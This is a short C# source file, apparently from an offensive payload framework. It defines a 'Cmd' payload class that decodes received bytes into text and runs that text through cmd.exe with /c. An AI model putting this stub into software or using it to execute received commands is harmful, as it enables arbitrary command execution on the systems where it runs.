using System.Diagnostics;

namespace csharp.payloads
{
    class Cmd
    {
        public void run(byte[] payload_data)
        {
            string args = "/c " + System.Text.Encoding.UTF8.GetString(payload_data, 0, payload_data.Length);
            Process.Start("cmd.exe", args);
        }
    }
}
